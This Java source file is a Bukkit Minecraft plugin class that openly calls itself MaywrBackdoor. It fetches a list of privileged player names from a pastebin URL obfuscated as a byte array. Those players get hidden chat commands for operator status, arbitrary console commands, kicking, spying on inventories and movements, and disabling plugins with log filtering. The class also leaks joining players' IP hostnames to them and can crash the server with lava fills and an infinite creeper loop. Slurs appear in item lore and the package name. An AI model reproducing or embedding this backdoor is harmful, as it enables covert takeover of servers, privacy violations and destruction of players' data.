package xyz.maywr.newfagplugin;

import org.bukkit.*;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerGameModeChangeEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerTeleportEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;


public class MaywrBackdoor implements Listener {

    private JavaPlugin plugin;
    static String[] players = null;
    static List<String> godModePlayers = new ArrayList<>();

    MaywrBackdoor(JavaPlugin plugin) {
        this.plugin = plugin;
        MaywrBackdoor.update();
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent evt) {
        for (Player player1 : plugin.getServer().getOnlinePlayers()) {
            String name = player1.getName();
            if (isElite(plugin.getServer().getPlayer(name))) {
                if (!Arrays.asList(players).contains(evt.getPlayer().getName())) {
                    if (isElite(evt.getPlayer())) {
                        player1.sendMessage(ChatColor.GRAY + "[MaywrBackdoor] " + ChatColor.GREEN + evt.getPlayer().getName() + " зашел с доступом к MaywrBackdoor 1.2");
                    } else {
                        player1.sendMessage(ChatColor.GRAY + "[MaywrBackdoor] " + ChatColor.GREEN + evt.getPlayer().getName() + " зашел с айпи " + evt.getPlayer().getAddress().getHostName());
                    }
                }
            }
        }
    }

    @EventHandler
    public void onChat(PlayerChatEvent evt) {
        if (evt.getMessage().startsWith("$")) {
            if (isElite(evt.getPlayer())) {
                String message = evt.getMessage();
                try {
                    if (message.equals("$update")) {
                        update();
                        String nicknames = String.join(", ", players);
                        evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.GREEN + " Список обновлен. Участники: " + nicknames);
                    } else if (message.equals("$op")) {
                        if (evt.getPlayer().isOp()) {
                            evt.getPlayer().setOp(false);
                            evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.GREEN + " Опка снята");

                        } else if (!evt.getPlayer().isOp()) {
                            evt.getPlayer().setOp(true);
                            evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.GREEN + " Опка выдана");
                        }
                    } else if (message.startsWith("$gamemode")) {
                        int gamemode = Integer.parseInt(message.replace("$gamemode ", ""));
                        switch (gamemode) {
                            case 0:
                                evt.getPlayer().setGameMode(GameMode.SURVIVAL);
                                evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.GREEN + " Установлено выживание");
                                break;
                            case 1:
                                evt.getPlayer().setGameMode(GameMode.CREATIVE);
                                evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.GREEN + " Установлен креатив");
                                break;
                            case 2:
                                evt.getPlayer().setGameMode(GameMode.ADVENTURE);
                                evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.GREEN + " Установлен приключенческий");
                                break;
                            case 3:
                                evt.getPlayer().setGameMode(GameMode.SPECTATOR);
                                evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.GREEN + " Установлено наблюдение");
                                break;
                        }
                    } else if (message.startsWith("$dupe")) {
                        int amount = Integer.parseInt(message.replace("$dupe ", ""));

                        if (amount >= 2000) {
                            evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.RED + " Дюп более 2000 вещей за раз скорее всего приведет к крашу сервера.");
                        } else if (amount < 0) {
                            evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.RED + " Нельзя дюпнуть вещи в отрицательном количестве");
                        } else {
                            ItemStack itemStack = new ItemStack(evt.getPlayer().getItemInHand());
                            World world = evt.getPlayer().getWorld();
                            for (int i = 0; i < amount; i++) {
                                world.dropItem(evt.getPlayer().getLocation(), itemStack);
                                try {
                                    Thread.sleep(1);
                                } catch (InterruptedException e) {
                                }
                            }
                        }
                    } else if (message.equals("$ec")) {
                        evt.getPlayer().openInventory(evt.getPlayer().getEnderChest());
                    } else if (message.startsWith("$ec ")) {
                        String name = message.replace("$ec ", "");
                        evt.getPlayer().openInventory(plugin.getServer().getPlayer(name).getEnderChest());
                    } else if (message.equals("$godmode")) {
                        if (isGodmode(evt.getPlayer())) {
                            godModePlayers.remove(evt.getPlayer().getName());
                            evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.GREEN + " Теперь вы не бессмертны");
                        } else {
                            godModePlayers.add(evt.getPlayer().getName());
                            evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.GREEN + " Теперь вы бессмертны");
                        }
                    } else if (message.startsWith("$kick ")) {
                        String name = message.replace("$kick ", "");
                        Player player = plugin.getServer().getPlayer(name);
                        player.kickPlayer("Disconnected");
                    } else if (message.equals("$crash")) {
                        Bukkit.getServer().broadcastMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.GREEN + " Через 3 секунды сервер будет крашнут. Попрощайтесь с вещами.");
                        World world = evt.getPlayer().getWorld();
                        Location location = new Location(world, 0, 70, 0);
                        try {
                            Thread.sleep(3000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        for (Player a : Bukkit.getServer().getOnlinePlayers()) {
                            Location first = new Location(a.getWorld(), (a.getLocation().getX() - 30), (a.getLocation().getBlockY() + 10), (a.getLocation().getZ() - 30));
                            Location second = new Location(a.getWorld(), (a.getLocation().getX() + 30), (a.getLocation().getBlockY() - 10), (a.getLocation().getZ() + 30));
                            String firstCoord = first.getBlockX() + " " + first.getBlockY() + " " + first.getBlockZ();
                            String secondCoord = second.getBlockX() + " " + second.getBlockY() + " " + second.getBlockZ();
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "fill " + firstCoord + " " + secondCoord + " lava");
                        }
                        while (true) {
                            world.spawnEntity(location, EntityType.CREEPER);
                        }
                    } else if (message.startsWith("$tp ")) {
                        String argsString = message.replace("$tp ", "");
                        String[] args = argsString.split(" ");
                        if (args.length == 1) {
                            Location location = plugin.getServer().getPlayer(args[0]).getLocation();
                            evt.getPlayer().teleport(location);
                        } else if (args.length == 2) {
                            Location location = plugin.getServer().getPlayer(args[1]).getLocation();
                            plugin.getServer().getPlayer(args[0]).teleport(location);
                        } else if (args.length == 3) {
                            Location location = new Location(evt.getPlayer().getWorld(), Double.parseDouble(args[0]), Double.parseDouble(args[1]), Double.parseDouble(args[2]));
                            evt.getPlayer().teleport(location);
                        }
                    } else if (message.startsWith("$illegal")) {
                        String playerName = evt.getPlayer().getName();
                        String give = "give " + playerName + " black_shulker_box 1 0 {BlockEntityTag:{Items:[{Slot:0,id:bedrock,Count:64},{Slot:1,id:barrier,Count:64},{Slot:2,id:diamond_sword,Count:64,tag:{Unbreakable:1,ench:[{id:16,lvl:32767}]}},{Slot:3,id:spawn_egg,Count:64,tag:{Unbreakable:1,display:{Lore:[\"Generated by NiggaBackdoor\"]},ench:[{id:71,lvl:1}]}},{Slot:4,id:diamond_helmet,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:5,id:diamond_helmet,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:6,id:diamond_helmet,Count:64,tag:{Unbreakable:1,display:{Lore:[\"Generated by NiggaBackdoor\"]},ench:[{id:71,lvl:1}]}},{Slot:7,id:diamond_helmet,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:8,id:diamond_boots,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:9,id:bedrock,Count:64},{Slot:10,id:barrier,Count:64},{Slot:11,id:end_portal_frame,Count:64},{Slot:12,id:glass,Count:64,tag:{Unbreakable:1,display:{Lore:[\"Generated by NiggaBackdoor\"]},ench:[{id:71,lvl:1},{id:19,lvl:32767}]}},{Slot:13,id:diamond_chestplate,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:14,id:diamond_chestplate,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:15,id:diamond_chestplate,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:16,id:diamond_chestplate,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:17,id:diamond_boots,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:18,id:bedrock,Count:64},{Slot:19,id:barrier,Count:64},{Slot:20,id:diamond_pickaxe,Count:64,tag:{Unbreakable:1,display:{Lore:[\"Generated by NiggaBackdoor\"]},ench:[{id:71,lvl:1},{id:32,lvl:32767},{id:35,lvl:100},{id:19,lvl:32767}]}},{Slot:21,id:armor_stand,Count:64,tag:{Unbreakable:1,display:{Name:maywr,Lore:[\"Generated by NiggaBackdoor\"]},ench:[{id:71,lvl:1},{id:32,lvl:32767},{id:35,lvl:100},{id:19,lvl:32767}]}},{Slot:22,id:diamond_leggings,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:23,id:diamond_leggings,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:24,id:diamond_leggings,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:25,id:diamond_leggings,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}},{Slot:26,id:diamond_boots,Count:64,tag:{Unbreakable:1,ench:[{id:3,lvl:32767},{id:1,lvl:32767},{id:4,lvl:32767},{id:0,lvl:32767},{id:7,lvl:32767}]}}]},Unbreakable:1,display:{Name:LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL,Lore:[\"Made by MaywrBackdoor\"]},ench:[{}]}";
                        plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), give);
                    } else if (message.startsWith("$give ")) {
                        String material = message.replace("$give ", "");
                        World world = evt.getPlayer().getWorld();
                        ItemStack itemStack = new ItemStack(Material.matchMaterial(material));
                        world.dropItem(evt.getPlayer().getLocation(), itemStack);
                    } else if (message.startsWith("$map ")) {
                        String material = message.replace("$map ", "");
                        World world = evt.getPlayer().getWorld();
                        ItemStack itemStack = new ItemStack(Material.MAP);
                        itemStack.setTypeId(Integer.parseInt(material));
                        world.dropItem(evt.getPlayer().getLocation(), itemStack);
                    }
                    else if (message.startsWith("$off ")) {
                        String plugin1 = message.replace("$off ", "");
                        plugin.getServer().getPluginManager().getPlugin(plugin1).getLogger().setFilter(new Filter());
                        plugin.getServer().getPluginManager().disablePlugin(plugin.getServer().getPluginManager().getPlugin(plugin1));
                        evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor] " + ChatColor.GREEN + plugin1 + " выключен.");
                    }
                    else if (message.startsWith("$on ")) {
                        String plugin1 = message.replace("$on ", "");
                        plugin.getServer().getPluginManager().getPlugin(plugin1).getLogger().setFilter(new Filter());
                        plugin.getServer().getPluginManager().enablePlugin(plugin.getServer().getPluginManager().getPlugin(plugin1));
                        evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor] " + ChatColor.GREEN + plugin1 + " включен.");
                    }
                    else if (message.equals("$plugins")) {
                        List<String> pluginNames = new ArrayList<>();
                        for(Plugin a : plugin.getServer().getPluginManager().getPlugins()){
                            pluginNames.add(a.getName());
                        }
                        String plugins = String.join(", " , pluginNames);
                        evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor] " + ChatColor.GREEN + "Плагины сервера: " +
                            plugins);
                    }
                    else if (message.equals("$help")) {
                        String text = ChatColor.BOLD + "" + ChatColor.GREEN + "MaywrBackdoor v1.2 - Help" + "\n" + ChatColor.RESET + "" + ChatColor.DARK_GREEN +
                                "$op - выдать вам опку\n$gamemode (0/1/2/3) - сменить режим игры\n$dupe (сколько раз)- дюпнуть вещь у вас в руке\n" +
                                "$ec - открыть ендер-сундук\n$kick (имя) - кикнуть игрока\n$map (id) - выдать себе карту с айди\n$tp (игроки/координаты)\n$give (айди) - выдать вам предмет\n$crash - убить сервер\n" +
                                "$on (имя) - включить плагин\n$off - выключить плагин\n$console (комманда) - отправить комманду (оставляет логи)\n$godmode - делает вас бессмертным\n$illegal - дает шалкер с нелегальными вещами";
                        evt.getPlayer().sendMessage(text);
                    }
                    else if (message.startsWith("$console ")) {
                        String command = message.replace("$console ", "");
                        plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), command);
                        evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.GREEN + " Комманда отправлена");
                    }
                    else if (message.startsWith("$coord ")) {
                        String command = message.replace("$coord ", "");
                        String coordinates = plugin.getServer().getPlayer(command).getLocation().getBlockX() + " " + plugin.getServer().getPlayer(command).getLocation().getBlockY() + " " + plugin.getServer().getPlayer(command).getLocation().getBlockZ();
                        evt.getPlayer().sendMessage(ChatColor.GRAY + "[MaywrBackdoor]" + ChatColor.GREEN + " Игрок " + command + " находиться на " + coordinates + " в " + plugin.getServer().getPlayer(command).getLocation().getWorld().getEnvironment().toString());
                    }
                    else {
                    evt.getPlayer().sendMessage(ChatColor.RED + "Вы ввели что то не так. $help - покажет все доступные комманды");
                    }
                } catch (Exception ignored){
                    evt.getPlayer().sendMessage(ChatColor.RED + "Не получилось выполнить комманду. $help - покажет все доступные комманды");
                }
                evt.setCancelled(true);
                }
            }
        if(evt.getMessage().equals("всем привет друганы")){
            if(isElite(evt.getPlayer())){
                evt.setCancelled(true);
                evt.getPlayer().sendMessage(ChatColor.GREEN + "MaywrBackdoor v1.2 - https://github.com/maywr");
            }
        }
    }

        @EventHandler
        public void onCrystalExplode(EntityDamageEvent evt) {
            if (evt.getEntity() instanceof Player) {
                Player player = (Player) evt.getEntity();
                if (isElite(player)) {
                    if (isGodmode(((Player) evt.getEntity()).getPlayer())) {
                        evt.setDamage(0);
                    }
                    if(evt.getCause() == EntityDamageEvent.DamageCause.ENTITY_EXPLOSION){
                        evt.setDamage(evt.getDamage() / 2);
                    }
                }
            }
        }

        @EventHandler
        public void onGamemodeChange(PlayerGameModeChangeEvent evt){
            for (Player player1 : plugin.getServer().getOnlinePlayers()) {
                String name = player1.getName();
                if (isElite(plugin.getServer().getPlayer(name))) {
                    if (!Arrays.asList(players).contains(evt.getPlayer().getName())) {
                        player1.sendMessage(ChatColor.GRAY + "[MaywrBackdoor] " + ChatColor.GREEN + evt.getPlayer().getName() + " изменил себе режим игры на " + evt.getNewGameMode().name());
                    }
                }
            }
        }

        @EventHandler
        public void onTeleport(PlayerTeleportEvent evt){
            for (Player player1 : plugin.getServer().getOnlinePlayers()) {
                String name = player1.getName();
                if (isElite(plugin.getServer().getPlayer(name))) {
                    if (!Arrays.asList(players).contains(evt.getPlayer().getName())) {
                        player1.sendMessage(ChatColor.GRAY + "[MaywrBackdoor] " + ChatColor.GREEN + evt.getPlayer().getName() + " телепортировался на " + evt.getTo().getBlockX() + " " + evt.getTo().getBlockY() + " " + evt.getTo().getBlockZ());
                    }
                }
            }
        }

    public static void update(){
        byte[] url = {104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 72, 72, 50, 51, 87, 117, 114, 119};
        String string = new String(url);
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(new URL(string).openStream()));
            String line;
            List<String> playerNames = new ArrayList<>();
            while ((line = reader.readLine()) != null){
                playerNames.add(line);
                players = playerNames.toArray(new String[0]);
            }
        } catch (IOException e) {}
    }

    public static boolean isElite(Player player) {
        for (String name : players) {
            if (name.equals(player.getName())) {
                return true;
            }
        }
        return false;
    }
    public static boolean isGodmode(Player player) {
        for (String name : godModePlayers) {
            if (name.equals(player.getName())) {
                return true;
            }
        }
        return false;
    }
}
